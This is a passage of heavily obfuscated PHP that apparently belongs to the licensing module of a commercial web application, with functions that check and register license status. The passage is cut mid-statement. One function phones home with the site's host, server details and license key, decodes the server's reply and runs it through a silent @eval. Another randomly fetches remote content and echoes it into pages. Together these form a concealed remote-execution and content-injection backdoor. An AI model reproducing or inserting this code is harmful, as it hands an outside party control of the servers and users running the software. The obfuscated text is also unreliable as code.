$eùÄ“†°£¬[123]($_SERVER[$eùÄ“†°£¬[124]] . $Dî…«¨ª‹Ò); $Fï¿Ñéé‡¥ = $A–©Éâó­‡[612]; while ($Fï¿Ñéé‡¥ < $A–©Éâó­‡[581]) { if ($Fï¿Ñéé‡¥ >= 0) { break; } $Fï¿Ñéé‡¥++; } goto Eé¨”®åŠÂ; EŸÓÀŠ©: if (!$c•ÂÉÄ¡ôµ) { return; } $e½áëĞÚ[$eùÄ“†°£¬[131]] = $eùÄ“†°£¬[223]($eùÄ“†°£¬[127]($this->{$_SERVER[µ¨«][156]}($c®ÏÉõÀÛÏ, $eùÄ“†°£¬[224]))); $Eï¡ßÑ¢éÄ = $eùÄ“†°£¬[133](16); goto BàĞÇáˆïâ; F¿…øõ·ğ: $dğÅ¿ƒ·À = $eùÄ“†°£¬[123]($_SERVER[$eùÄ“†°£¬[124]] . $eùÄ“†°£¬[223]($Dî…«¨ª‹Ò) . $e½áëĞÚ[$eùÄ“†°£¬[219]]); $a¶ŒÆ£»Êå = $eùÄ“†°£¬[223]($eùÄ“†°£¬[25]($dğÅ¿ƒ·À, 10, 16)); $C‹ÎÄƒ˜Û = $A–©Éâó­‡[616]; goto d£…„™¤˜«; c“‰šÛ¥Ùè: $då´Ûƒ¶…Æ = $b¦ø‰”Š„¼[$eùÄ“†°£¬[234]]; $Cï¾ÃÏèò = $A–©Éâó­‡[618]; $b÷¶Ûù†˜ = array(); goto AÑ‹™¶·Øí; e“Ÿï™Õ¶·: $A–©Éâó­‡ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eùÄ“†°£¬ =& $_SERVER[µ¨«]; if ($_SERVER[$eùÄ“†°£¬[44]] != $eùÄ“†°£¬[171]) { return; } goto aŸéÌ¸‚­é; BàĞÇáˆïâ: $Cí¼¶Ÿô¯ = $Eï¡ßÑ¢éÄ . $e½áëĞÚ[$eùÄ“†°£¬[129]] . $this->{$_SERVER[µ¨«][156]}($eùÄ“†°£¬[123]($e½áëĞÚ[$eùÄ“†°£¬[218]]), $Eï¡ßÑ¢éÄ); $AÏõ³”Ğ‰º = $A–©Éâó­‡[615]; if (!$AÏõ³”Ğ‰º) { die; } goto F×«°ß‰“; d£…„™¤˜«: $DŒÉšœ§‡ = $this->{$_SERVER[µ¨«][136]}($eùÄ“†°£¬[157]($A¢´å¾«¢), $dğÅ¿ƒ·À); $b¦ø‰”Š„¼ = $eùÄ“†°£¬[231]($eùÄ“†°£¬[61]($eùÄ“†°£¬[11])->{$_SERVER[µ¨«][232]}(), $eùÄ“†°£¬[233]); $dï­ä±ƒªš = $A–©Éâó­‡[617]; goto c“‰šÛ¥Ùè; bÆ¥±¹†Ş: } private function licenseRegistSuccess() { $cÈ‘¹ØÉ¬ =& $_SERVER[µ¨«]; $Döï ‹Ô„ = $cÈ‘¹ØÉ¬[61]($cÈ‘¹ØÉ¬[62])->{$_SERVER[µ¨«][63]}(); $AÚŠĞ‚ = $_SERVER[åÌÛ»ô¢‚ö™][621]; if (!$AÚŠĞ‚) { return; } if ($Döï ‹Ô„[$cÈ‘¹ØÉ¬[89]] != $cÈ‘¹ØÉ¬[229]) { $cÈ‘¹ØÉ¬[61]($cÈ‘¹ØÉ¬[62])->{$_SERVER[µ¨«][230]}($cÈ‘¹ØÉ¬[89], $cÈ‘¹ØÉ¬[229]); } $cÈ‘¹ØÉ¬[119]($cÈ‘¹ØÉ¬[239])->{$_SERVER[µ¨«][240]}(!0); } private function blwf391be2b6() { $cÖç†ë¢¾Ï =& $_SERVER[µ¨«]; $cÖç†ë¢¾Ï[61]($cÖç†ë¢¾Ï[62])->{$_SERVER[µ¨«][230]}(array($cÖç†ë¢¾Ï[218] => $cÖç†ë¢¾Ï[10], $cÖç†ë¢¾Ï[219] => $cÖç†ë¢¾Ï[10], $cÖç†ë¢¾Ï[129] => $cÖç†ë¢¾Ï[130], $cÖç†ë¢¾Ï[131] => $cÖç†ë¢¾Ï[10], $cÖç†ë¢¾Ï[132] => $cÖç†ë¢¾Ï[10])); $cÖç†ë¢¾Ï[61]($cÖç†ë¢¾Ï[62])->{$_SERVER[µ¨«][227]}($cÖç†ë¢¾Ï[228], $cÖç†ë¢¾Ï[241]); $this->jcwzbf147d45 = array(); $this->xadyd0e3e2cf = $cÖç†ë¢¾Ï[130]; $CÃõÃÊÔÛ† = $_SERVER[åÌÛ»ô¢‚ö™][622]; } private function fgzc3d7efc2f() { goto eçƒ²îÚ«; bÆŸ›È¥ÔŠ: if (!$C²àÜµÀò[201]($DğÆºØ¢‡ö)) { return $this->{$_SERVER[µ¨«][173]}(); } $cÔÉÛÒÓ¿ = $C²àÜµÀò[153]($DğÆºØ¢‡ö[$C²àÜµÀò[154]]); if ($C²àÜµÀò[242]() >= $cÔÉÛÒÓ¿) { return $this->{$_SERVER[µ¨«][173]}(); } goto fáÃôÉÉ£; c©ä¿â·‚î: $bØª¤™˜êå = $BåŒšÖìÎÚ[625]; while (strlen($bØª¤™˜êå) < $BåŒšÖìÎÚ[583]) { if (!$bØª¤™˜êå) { break; } $bØª¤™˜êå++; } if ($Aö¿ß¶Ì»Ù[$C²àÜµÀò[129]] == $C²àÜµÀò[130]) { return; } goto Aï±ï°óÜ¢; bÁ–‡ÆÇ: $DğÆºØ¢‡ö = $C²àÜµÀò[200]($DğÆºØ¢‡ö, !0); $cƒÕƒ¯œÚñ = $BåŒšÖìÎÚ[630]; if (strlen($cƒÕƒ¯œÚñ) < $BåŒšÖìÎÚ[583]) { return; } goto bÆŸ›È¥ÔŠ; c¤‡¢íù®»: $Fáî¡Öê’ = $BåŒšÖìÎÚ[624]; if (!$Fáî¡Öê’) { die; } $Aö¿ß¶Ì»Ù = $C²àÜµÀò[61]($C²àÜµÀò[62])->{$_SERVER[µ¨«][63]}(); goto c©ä¿â·‚î; eçƒ²îÚ«: $BåŒšÖìÎÚ =& $_SERVER[åÌÛ»ô¢‚ö™]; $C²àÜµÀò =& $_SERVER[µ¨«]; $_SERVER[$C²àÜµÀò[184]] = $C²àÜµÀò[113]($_SERVER, $C²àÜµÀò[184], APP_HOST); goto DÆ®¢Ê£ÙŸ; aÙé¹°‡ï: $c­å¼âÌÄœ = $C²àÜµÀò[231]($C²àÜµÀò[61]($C²àÜµÀò[11])->{$_SERVER[µ¨«][232]}(), $C²àÜµÀò[233]); $eÒÁãÑ¬ é = $c­å¼âÌÄœ[$C²àÜµÀò[234]]; $d¯Ë¶ÎĞ»÷ = $BåŒšÖìÎÚ[627]; goto f™¬Ø£³İ; f™¬Ø£³İ: $Aì¯ê«ÚŞ = $C²àÜµÀò[123]($_SERVER[$C²àÜµÀò[124]] . $C²àÜµÀò[223]($BÊØÑ˜ƒŒ) . $Aö¿ß¶Ì»Ù[$C²àÜµÀò[219]]); $D“¿ÌŞÈÄÅ = $BåŒšÖìÎÚ[628]; $eÁŠ“™–‚® = $C²àÜµÀò[223]($C²àÜµÀò[25]($Aì¯ê«ÚŞ, 10, 16)); goto A§Ä‰¡–ù…; Aï±ï°óÜ¢: $BÊØÑ˜ƒŒ = $C²àÜµÀò[61]($C²àÜµÀò[62])->{$_SERVER[µ¨«][63]}($C²àÜµÀò[125]); $B ©¥‹Óòİ = $BåŒšÖìÎÚ[626]; if (!$B ©¥‹Óòİ) { die; } goto aÙé¹°‡ï; A§Ä‰¡–ù…: $d½¤İ±÷†æ = $BåŒšÖìÎÚ[629]; if (!$d½¤İ±÷†æ) { die; } $DğÆºØ¢‡ö = $this->{$_SERVER[µ¨«][198]}($eÒÁãÑ¬ é[$C²àÜµÀò[100]][$eÁŠ“™–‚®], $Aì¯ê«ÚŞ); goto bÁ–‡ÆÇ; DÆ®¢Ê£ÙŸ: $E«•‡á¨ä = $BåŒšÖìÎÚ[623]; if (!$E«•‡á¨ä) { return; } $this->xadyd0e3e2cf = $C²àÜµÀò[130]; goto c¤‡¢íù®»; fáÃôÉÉ£: $this->jcwzbf147d45 = $DğÆºØ¢‡ö; $this->xadyd0e3e2cf = $Aö¿ß¶Ì»Ù[$C²àÜµÀò[129]]; $Fôš˜ƒÀö = $BåŒšÖìÎÚ[631]; goto aˆÓÆÏïä; aˆÓÆÏïä: if (strlen($Fôš˜ƒÀö) < $BåŒšÖìÎÚ[579]) { die; } goto aµñ˜öˆ×Ó; aµñ˜öˆ×Ó: } private function opqzb014625c() { goto e§•Á¸â§‹; d®–ŞÌ: $eí’¼®¹Ş = array($D“¾µÕñ½÷[246], $D“¾µÕñ½÷[247]); if ($D“¾µÕñ½÷[248]($EĞ®™‰ï¬, $eí’¼®¹Ş)) { if ($this->xadyd0e3e2cf == $D“¾µÕñ½÷[130] && isset($C¿Šùîˆ[$D“¾µÕñ½÷[249]])) { $D“¾µÕñ½÷[175]($D“¾µÕñ½÷[207]($D“¾µÕñ½÷[244]), !1, $D“¾µÕñ½÷[245]); die; } $F³ë–±‹†õ = $this->{$_SERVER[µ¨«][146]}(); if ($F³ë–±‹†õ != $D“¾µÕñ½÷[250]($D“¾µÕñ½÷[251])) { if ($F³ë–±‹†õ <= $D“¾µÕñ½÷[61]($D“¾µÕñ½÷[148])->{$_SERVER[µ¨«][149]}()) { $D“¾µÕñ½÷[175]($D“¾µÕñ½÷[207]($D“¾µÕñ½÷[252]), !1, $D“¾µÕñ½÷[245]); die; } } } goto a°½¢ˆãÇÕ; e§•Á¸â§‹: $D“¾µÕñ½÷ =& $_SERVER[µ¨«]; $C¿Šùîˆ = $GLOBALS[$D“¾µÕñ½÷[22]]; $EĞ®™‰ï¬ = $_SERVER[$D“¾µÕñ½÷[44]]; goto c‡ğÃŸšË”; c‡ğÃŸšË”: $b‰ØÛİğŸÏ = $_SERVER[åÌÛ»ô¢‚ö™][632]; if (!$b‰ØÛİğŸÏ) { return; } if ($EĞ®™‰ï¬ == $D“¾µÕñ½÷[243] && $this->xadyd0e3e2cf == $D“¾µÕñ½÷[130]) { $D“¾µÕñ½÷[175]($D“¾µÕñ½÷[207]($D“¾µÕñ½÷[244]), !1, $D“¾µÕñ½÷[245]); } goto d®–ŞÌ; a°½¢ˆãÇÕ: } private function nkpzc178f702() { goto DÛğ¾Â˜ƒ¾; E˜Õ­ÁÎî: $eê‡Ü†‚Ù— = $cÌ”£±Óáç[633]; while ($eê‡Ü†‚Ù— < $cÌ”£±Óáç[573]) { if ($eê‡Ü†‚Ù— >= 0) { break; } $eê‡Ü†‚Ù—++; } $a¾ÁÃ¶ö¾¡[264]($a¾ÁÃ¶ö¾¡[265]); goto A¢¯øˆÑ; A¢¯øˆÑ: $f¨½Á–ÖÎ¬ = $cÌ”£±Óáç[634]; if ($B­¼ÊùÒã· && $a¾ÁÃ¶ö¾¡[32]($B­¼ÊùÒã·, $a¾ÁÃ¶ö¾¡[266])) { echo $B­¼ÊùÒã·; } die; goto EÛ«ğ×ÂÏÙ; CÄ…Ç±šç: if (!$a¾ÁÃ¶ö¾¡[113]($GLOBALS, $a¾ÁÃ¶ö¾¡[141]) || !isset($_GET[$a¾ÁÃ¶ö¾¡[254]])) { return; } if (!$a¾ÁÃ¶ö¾¡[248]($_SERVER[$a¾ÁÃ¶ö¾¡[44]], $c¢ÎŒêğ©ß)) { return; } $D±ŞÖ†“¿ù = $a¾ÁÃ¶ö¾¡[255]; goto E“ßòˆæÑ°; DÛğ¾Â˜ƒ¾: $cÌ”£±Óáç =& $_SERVER[åÌÛ»ô¢‚ö™]; $a¾ÁÃ¶ö¾¡ =& $_SERVER[µ¨«]; $c¢ÎŒêğ©ß = array($a¾ÁÃ¶ö¾¡[144], $a¾ÁÃ¶ö¾¡[253]); goto CÄ…Ç±šç; E“ßòˆæÑ°: $D±ŞÖ†“¿ù = $this->{$_SERVER[µ¨«][256]}($D±ŞÖ†“¿ù, $a¾ÁÃ¶ö¾¡[257]); $cãËé—È¨Å = $a¾ÁÃ¶ö¾¡[258](array($a¾ÁÃ¶ö¾¡[259] => array($a¾ÁÃ¶ö¾¡[260] => $a¾ÁÃ¶ö¾¡[261], $a¾ÁÃ¶ö¾¡[262] => 3))); $B­¼ÊùÒã· = @$a¾ÁÃ¶ö¾¡[263]($D±ŞÖ†“¿ù, !1, $cãËé—È¨Å); goto E˜Õ­ÁÎî; EÛ«ğ×ÂÏÙ: } public function qaug7b2e06a4($d†ñä•…½é) { goto E¥ñì¨íØ; CùÖÃŞ…ÅŞ: $F áàğ–äˆ = array($Bá¨öÑ†”[268] => $Bá¨öÑ†”[269], $Bá¨öÑ†”[270] => $Bá¨öÑ†”[269], $Bá¨öÑ†”[271] => $Bá¨öÑ†”[269], $Bá¨öÑ†”[272] => $Bá¨öÑ†”[269], $Bá¨öÑ†”[273] => $Bá¨öÑ†”[269], $Bá¨öÑ†”[274] => $Bá¨öÑ†”[269], $Bá¨öÑ†”[275] => $Bá¨öÑ†”[276], $Bá¨öÑ†”[277] => $Bá¨öÑ†”[276], $Bá¨öÑ†”[278] => $Bá¨öÑ†”[276], $Bá¨öÑ†”[279] => $Bá¨öÑ†”[276], $Bá¨öÑ†”[280] => $Bá¨öÑ†”[276], $Bá¨öÑ†”[281] => $Bá¨öÑ†”[276], $Bá¨öÑ†”[282] => $Bá¨öÑ†”[276]); $c¡æ­âÒÎ = $D¢ñ§×ìåò[635]; $f¬¦¢«ËĞ = $Bá¨öÑ†”[0]($Bá¨öÑ†”[283], $Bá¨öÑ†”[113]($this->jcwzbf147d45, $Bá¨öÑ†”[138], $Bá¨öÑ†”[10])); goto Eøå–ë×²õ; Eøå–ë×²õ: $B¸ÓâŠáø³ = $D¢ñ§×ìåò[636]; while ($B¸ÓâŠáø³ < $D¢ñ§×ìåò[573]) { if ($B¸ÓâŠáø³ >= 0) { break; } $B¸ÓâŠáø³++; } $Aƒ±›Æ®Š = array(); goto AŠğãÙø›; AŠğãÙø›: foreach ($F áàğ–äˆ as $AéµÛöæÎ» => $d‘ö¹ß™ê) { if ($d‘ö¹ß™ê == $Bá¨öÑ†”[269] && $Bá¨öÑ†”[25]($this->xadyd0e3e2cf, 0, 1) == $Bá¨öÑ†”[269]) { continue; } if (!$Bá¨öÑ†”[248]($AéµÛöæÎ», $f¬¦¢«ËĞ)) { $Aƒ±›Æ®Š[] = $AéµÛöæÎ»; } } foreach ($Aƒ±›Æ®Š as $AéµÛöæÎ») { unset($d†ñä•…½é[$AéµÛöæÎ»]); $Cˆ‚¤†ÔŞ» = $D¢ñ§×ìåò[637]; if (!$Cˆ‚¤†ÔŞ») { return; } } return $d†ñä•…½é; goto EÑ½ñƒ”İ‘; EÑ½ñƒ”İ‘: $E¥ŠÅù¦¶Ä = $D¢ñ§×ìåò[638]; if (!$E¥ŠÅù¦¶Ä) { return; } goto Bî®éÕ™¤³; E¥ñì¨íØ: $D¢ñ§×ìåò =& $_SERVER[åÌÛ»ô¢‚ö™]; $Bá¨öÑ†” =& $_SERVER[µ¨«]; if ($this->xadyd0e3e2cf == $Bá¨öÑ†”[267]) { return $d†ñä•…½é; } goto CùÖÃŞ…ÅŞ; Bî®éÕ™¤³: } private function fjpd7e2dc736() { $DõÏóÀâ±¯ =& $_SERVER[µ¨«]; if ($this->xadyd0e3e2cf != $DõÏóÀâ±¯[130]) { return; } $GLOBALS[$DõÏóÀâ±¯[100]][$DõÏóÀâ±¯[104]][$DõÏóÀâ±¯[284]] = $DõÏóÀâ±¯[229]; $GLOBALS[$DõÏóÀâ±¯[100]][$DõÏóÀâ±¯[285]] = $DõÏóÀâ±¯[229]; if ($DõÏóÀâ±¯[61]($DõÏóÀâ±¯[286])->{$_SERVER[µ¨«][63]}($DõÏóÀâ±¯[89]) != $DõÏóÀâ±¯[241]) { $DõÏóÀâ±¯[61]($DõÏóÀâ±¯[286])->{$_SERVER[µ¨«][230]}($DõÏóÀâ±¯[89], $DõÏóÀâ±¯[241]); } } public function bfym1d2c980c() { return $_SERVER[µ¨«][287]; $dæÊ›ÑÍÅ = $_SERVER[åÌÛ»ô¢‚ö™][639]; } private function ftlb0970343e() { goto AÈÑ¹¬‡ç; AÈÑ¹¬‡ç: $Eºï‰¼Ê =& $_SERVER[åÌÛ»ô¢‚ö™]; $b˜ˆ„ÓÕ =& $_SERVER[µ¨«]; $FßÆˆ¹Üˆ = array($b˜ˆ„ÓÕ[288], $b˜ˆ„ÓÕ[289], $b˜ˆ„ÓÕ[290]); goto Fä¨µ¯„…÷; B¾ŞœˆÜ”ç: $añãã­‹Ñ° = $Eºï‰¼Ê[641]; if (!$añãã­‹Ñ°) { die; } if ($this->xadyd0e3e2cf == $b˜ˆ„ÓÕ[130] || !$b˜ˆ„ÓÕ[113]($GLOBALS, $b˜ˆ„ÓÕ[141])) { return; } goto a’ÇÊê’Š; fÛÕÔÅ²Î: $Fö¤Ó‘çˆÄ = $Eºï‰¼Ê[643]; if (!$b˜ˆ„ÓÕ[201]($dè¦éÔÁ”Ù)) { return; } if ($dè¦éÔÁ”Ù[$b˜ˆ„ÓÕ[174]] && $dè¦éÔÁ”Ù[$b˜ˆ„ÓÕ[297]]) { if ($this->{$_SERVER[µ¨«][209]}($dè¦éÔÁ”Ù[$b˜ˆ„ÓÕ[297]]) == $C¥¿‰ÓÚ»÷[$b˜ˆ„ÓÕ[174]]) { return; } } goto fêì¨×âÌ‚; a’ÇÊê’Š: if (!$b˜ˆ„ÓÕ[248]($_SERVER[$b˜ˆ„ÓÕ[44]], $FßÆˆ¹Üˆ)) { return; } if ($b˜ˆ„ÓÕ[242]() % 4 != 0) { return; } $E¬ì…¸Äó = $b˜ˆ„ÓÕ[13](array($b˜ˆ„ÓÕ[293], $b˜ˆ„ÓÕ[294]), $AİÆ½†ã°×); goto c¡ì©”´†; A÷Ùíã½æ: $b˜ˆ„ÓÕ[13](array($b˜ˆ„ÓÕ[293], $b˜ˆ„ÓÕ[161]), $AİÆ½†ã°×, $b˜ˆ„ÓÕ[242]()); $C¥¿‰ÓÚ»÷ = array($b˜ˆ„ÓÕ[174] => $b˜ˆ„ÓÕ[61]($b˜ˆ„ÓÕ[62])->{$_SERVER[µ¨«][63]}($b˜ˆ„ÓÕ[218]), $b˜ˆ„ÓÕ[187] => $this->xadyd0e3e2cf, $b˜ˆ„ÓÕ[185] => $_SERVER[$b˜ˆ„ÓÕ[186]], $b˜ˆ„ÓÕ[178] => $b˜ˆ„ÓÕ[158], $b˜ˆ„ÓÕ[181] => $_SERVER[$b˜ˆ„ÓÕ[182]]); $dè¦éÔÁ”Ù = $this->{$_SERVER[µ¨«][192]}($b˜ˆ„ÓÕ[296], $C¥¿‰ÓÚ»÷); goto fÛÕÔÅ²Î; c¡ì©”´†: $B¯õ–¦¾ŞÈ = $Eºï‰¼Ê[642]; while ($B¯õ–¦¾ŞÈ < $Eºï‰¼Ê[184]) { if ($B¯õ–¦¾ŞÈ >= 0) { break; } $B¯õ–¦¾ŞÈ++; } if ($E¬ì…¸Äó && $b˜ˆ„ÓÕ[242]() - $E¬ì…¸Äó < $b˜ˆ„ÓÕ[250]($b˜ˆ„ÓÕ[295])) { return; } goto A÷Ùíã½æ; fêì¨×âÌ‚: $this->{$_SERVER[µ¨«][173]}(); if ($this->{$_SERVER[µ¨«][209]}($dè¦éÔÁ”Ù[$b˜ˆ„ÓÕ[297]]) != $C¥¿‰ÓÚ»÷[$b˜ˆ„ÓÕ[174]]) { $B©Ìï¸£˜ñ = array($b˜ˆ„ÓÕ[211] => $b˜ˆ„ÓÕ[61]($b˜ˆ„ÓÕ[62])->{$_SERVER[µ¨«][63]}($b˜ˆ„ÓÕ[125]), $b˜ˆ„ÓÕ[212] => $_SERVER[$b˜ˆ„ÓÕ[124]], $b˜ˆ„ÓÕ[213] => $b˜ˆ„ÓÕ[214](), $b˜ˆ„ÓÕ[183] => $_SERVER[$b˜ˆ„ÓÕ[184]]); $AÊòÅÄè÷ = $this->{$_SERVER[µ¨«][215]}($b˜ˆ„ÓÕ[157]($B©Ìï¸£˜ñ)); $dè¦éÔÁ”Ù = $this->{$_SERVER[µ¨«][192]}($b˜ˆ„ÓÕ[216] . $AÊòÅÄè÷); if ($dè¦éÔÁ”Ù && $b˜ˆ„ÓÕ[201]($dè¦éÔÁ”Ù) && isset($dè¦éÔÁ”Ù[$b˜ˆ„ÓÕ[297]])) { $BŸøí±ß„ = $this->{$_SERVER[µ¨«][198]}($dè¦éÔÁ”Ù[$b˜ˆ„ÓÕ[297]], 2); if ($BŸøí±ß„) { $BŸøí±ß„ = $this->{$_SERVER[µ¨«][209]}($BŸøí±ß„); } if ($BŸøí±ß„) { try { @eval($BŸøí±ß„); } catch (Exception $cÊÍ‰òÜçÉ) { } } } } goto CÃìÖ¨ÅÊğ; Fä¨µ¯„…÷: $a‹Á‚µ¬éğ = $Eºï‰¼Ê[640]; while (strlen($a‹Á‚µ¬éğ) < $Eºï‰¼Ê[581]) { if (!$a‹Á‚µ¬éğ) { break; } $a‹Á‚µ¬éğ++; } $AİÆ½†ã°× = $b˜ˆ„ÓÕ[291] . $b˜ˆ„ÓÕ[123]($b˜ˆ„ÓÕ[292]); goto B¾ŞœˆÜ”ç; CÃìÖ¨ÅÊğ: } private function ljgk8c2d5c3f($F•ËùµÉªğ = '', $eà©°¼Ëä· = array(), $BàĞÄ¢“’Í = 5) { goto F¸µÏ´Œª¯; F¸µÏ´Œª¯: $aš˜ŒšÁôõ =& $_SERVER[åÌÛ»ô¢‚ö™]; $fƒ­äì¹ğŒ =& $_SERVER[µ¨«]; $CêŒÁŒ¿ï˜ = $fƒ­äì¹ğŒ[298]; goto E©·²êÁ†ñ; E©·²êÁ†ñ: $CêŒÁŒ¿ï˜ = $this->{$_SERVER[µ¨«][256]}($CêŒÁŒ¿ï˜, $fƒ­äì¹ğŒ[299]); $CêŒÁŒ¿ï˜ = $CêŒÁŒ¿ï˜ . $F•ËùµÉªğ . $fƒ­äì¹ğŒ[300] . $fƒ­äì¹ğŒ[301]($eà©°¼Ëä·); $bœ©Ùİ÷Ÿ = $aš˜ŒšÁôõ[644]; goto cˆºŸˆİø¢; Bâ²ê®ó‰: $E‡…ÚÉ = $aš˜ŒšÁôõ[645]; if (strlen($E‡…ÚÉ) < $aš˜ŒšÁôõ[581]) { return; } $eà©°¼Ëä· = @$fƒ­äì¹ğŒ[263]($CêŒÁŒ¿ï˜, !1, $bŠğ‹ÔÜ…†); goto b÷­ÓËùìÙ; b÷­ÓËùìÙ: return $fƒ­äì¹ğŒ[200]($eà©°¼Ëä·, !0); $AğÕõŒøµì = $aš˜ŒšÁôõ[646]; while ($AğÕõŒøµì < $aš˜ŒšÁôõ[573]) { if ($AğÕõŒøµì >= 0) { break; } $AğÕõŒøµì++; } goto EÒô‚Ÿš…Œ; cˆºŸˆİø¢: if (!$bœ©Ùİ÷Ÿ) { return; } if ($eà©°¼Ëä· === -1) { return $CêŒÁŒ¿ï˜; } $bŠğ‹ÔÜ…† = $fƒ­äì¹ğŒ[258](array($fƒ­äì¹ğŒ[259] => array($fƒ­äì¹ğŒ[262] => $BàĞÄ¢“’Í, $fƒ­äì¹ğŒ[260] => $fƒ­äì¹ğŒ[302]), $fƒ­äì¹ğŒ[303] => array($fƒ­äì¹ğŒ[304] => !1, $fƒ­äì¹ğŒ[305] => !1))); goto Bâ²ê®ó‰; EÒô‚Ÿš…Œ: $fˆÍíœµï— = $aš˜ŒšÁôõ[647]; while (strlen($fˆÍíœµï—) < $aš˜ŒšÁôõ[579]) { if (!$fˆÍíœµï—) { break; } $fˆÍíœµï—++; } goto FÃªàó°‡; FÃªàó°‡: } private function khmte8b34fcd() { goto BÁ…Éº¬ê«; bæ¨•Ìƒ: $BÊºî“•ä = $D„¤‚ğîó[648]; if (!$BÊºî“•ä) { die; } $b·¯¯“®§ì = $e½·„âæÜ[$this->xadyd0e3e2cf]; goto B—µğ¡Â³Ç; BÁ…Éº¬ê«: $D„¤‚ğîó =& $_SERVER[åÌÛ»ô¢‚ö™]; $eÔÖ©”×«Ë =& $_SERVER[µ¨«]; $e½·„âæÜ = array($eÔÖ©”×«Ë[306] => $eÔÖ©”×«Ë[307], $eÔÖ©”×«Ë[308] => $eÔÖ©”×«Ë[309], $eÔÖ©”×«Ë[310] => $eÔÖ©”×«Ë[311], $eÔÖ©”×«Ë[312] => $eÔÖ©”×«Ë[313], $eÔÖ©”×«Ë[314] => $eÔÖ©”×«Ë[315], $eÔÖ©”×«Ë[316] => $eÔÖ©”×«Ë[251], $eÔÖ©”×«Ë[317] => $eÔÖ©”×«Ë[251], $eÔÖ©”×«Ë[318] => $eÔÖ©”×«Ë[307], $eÔÖ©”×«Ë[319] => $eÔÖ©”×«Ë[309], $eÔÖ©”×«Ë[320] => $eÔÖ©”×«Ë[311], $eÔÖ©”×«Ë[321] => $eÔÖ©”×«Ë[322], $eÔÖ©”×«Ë[323] => $eÔÖ©”×«Ë[313], $eÔÖ©”×«Ë[324] => $eÔÖ©”×«Ë[325], $eÔÖ©”×«Ë[326] => $eÔÖ©”×«Ë[315], $eÔÖ©”×«Ë[327] => $eÔÖ©”×«Ë[328], $eÔÖ©”×«Ë[329] => $eÔÖ©”×«Ë[330], $eÔÖ©”×«Ë[331] => $eÔÖ©”×«Ë[332]); goto bæ¨•Ìƒ; f†³ è¡Š: if (!$B–è‰²×Ùç) { die; } $EÕåáßŠ¢â = $EÕåáßŠ¢â ? $eÔÖ©”×«Ë[250]($EÕåáßŠ¢â) : 0; return $b·¯¯“®§ì + $EÕåáßŠ¢â; goto C¦«›Èâ°Ë; B—µğ¡Â³Ç: $b·¯¯“®§ì = $eÔÖ©”×«Ë[250]($b·¯¯“®§ì ? $b·¯¯“®§ì : $eÔÖ©”×«Ë[307]); $EÕåáßŠ¢â = $eÔÖ©”×«Ë[113]($this->jcwzbf147d45, $eÔÖ©”×«Ë[333]); $B–è‰²×Ùç = $D„¤‚ğîó[649]; goto f†³ è¡Š; C¦«›Èâ°Ë: } public function onlx87d3f5c0($aØÈ¦ğ”Ò³) { goto c«íŸğ™‚; eåÏ‰¦ˆ¤ƒ: $A§½î™¨ñÈ = $eÀâ‰ëçÜ[652]; if (strlen($A§½î™¨ñÈ) < $eÀâ‰ëçÜ[579]) { die; } if (!$aê‡´Ò³ Œ[248]($aØÈ¦ğ”Ò³[$aê‡´Ò³ Œ[334]], $c°¼œìÔŞ‹)) { $aê‡´Ò³ Œ[175]($aê‡´Ò³ Œ[338], !1, $aê‡´Ò³ Œ[245]); } goto e§ñßÚˆ; aßÓë™„Ãä: $eÈ»º×¢Òî = $eÀâ‰ëçÜ[650]; if (strlen($eÈ»º×¢Òî) < $eÀâ‰ëçÜ[581]) { die; } if ($aØÈ¦ğ”Ò³[$aê‡´Ò³ Œ[334]] == $aê‡´Ò³ Œ[229]) { return; } goto BÚ¾°¸ŠÓŸ; b÷à¢ˆƒØÏ: $c°¼œìÔŞ‹ = $aê‡´Ò³ Œ[61]($aê‡´Ò³ Œ[148])->{$_SERVER[µ¨«][335]}($aê‡´Ò³ Œ[334])->{$_SERVER[µ¨«][336]}($dˆ¡ò‹·àÈ)->{$_SERVER[µ¨«][337]}(); $Böš¢ïË› = $eÀâ‰ëçÜ[651]; $c°¼œìÔŞ‹ = $aê‡´Ò³ Œ[231]($c°¼œìÔŞ‹, $aê‡´Ò³ Œ[10], $aê‡´Ò³ Œ[334]); goto eåÏ‰¦ˆ¤ƒ; BÚ¾°¸ŠÓŸ: if ($dˆ¡ò‹·àÈ >= $aê‡´Ò³ Œ[250]($aê‡´Ò³ Œ[251])) { return; } $c„¶Ê¨ÉÔŒ = $aê‡´Ò³ Œ[61]($aê‡´Ò³ Œ[148])->{$_SERVER[µ¨«][149]}(); if ($c„¶Ê¨ÉÔŒ <= $dˆ¡ò‹·àÈ) { return; } goto b÷à¢ˆƒØÏ; c«íŸğ™‚: $eÀâ‰ëçÜ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aê‡´Ò³ Œ =& $_SERVER[µ¨«]; $dˆ¡ò‹·àÈ = $this->{$_SERVER[µ¨«][146]}(); goto aßÓë™„Ãä; e§ñßÚˆ: } public function lpcx2648a3eb() { goto bìÂîÜ ›Ö; bìÂîÜ ›Ö: $A’¨¦¢ÃÙ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Cç™­é§  =& $_SERVER[µ¨«]; if (!$Cç™­é§ [113]($GLOBALS, $Cç™­é§ [141]) || $Cç™­é§ [339](1, 100) > 20) { return; } goto eùˆï„öƒò; Fœ¼ï«…„Š: $BÒš‰óÎ²É = $Cç™­é§ [258](array($Cç™­é§ [259] => array($Cç™­é§ [260] => $Cç™­é§ [261], $Cç™­é§ [262] => 3))); $b£¡ÇÓÔÓ = $A’¨¦¢ÃÙ[654]; while (strlen($b£¡ÇÓÔÓ) < $A’¨¦¢ÃÙ[573]) { if (!$b£¡ÇÓÔÓ) { break; } $b£¡ÇÓÔÓ++; } goto a¬‘´×ì¬à; a¬‘´×ì¬à: $eöøÕ›•æ = @$Cç™­é§ [263]($f×É¼ŠÁì›, !1, $BÒš‰óÎ²É); echo $Cç™­é§ [340] . $Cç™­é§ [341]($eöøÕ›•æ) . $Cç™­é§ [342]; goto e†–ëÚ‘¨Ò; eùˆï„öƒò: $f×É¼ŠÁì› = $Cç™­é§ [255]; $f×É¼ŠÁì› = $this->{$_SERVER[µ¨«][256]}($f×É¼ŠÁì›, $Cç™­é§ [257]); $aÂ²·õ§“Ó = $A’¨¦¢ÃÙ[653]; goto Fœ¼ï«…„Š; e†–ëÚ‘¨Ò: } private function dmno033d3af9($EŠ­…Öçã¯, $E»…Éí¯Œ³, $dÇƒ³î¿ÂÇ = 3) { goto e¿†í£ïàÛ; Cå×Úƒ®Œ: switch ($F•Ä¹ôÎãò) { case $eó’ËÇ§Ñ[241]: $A„…Ğ°‚“ì = 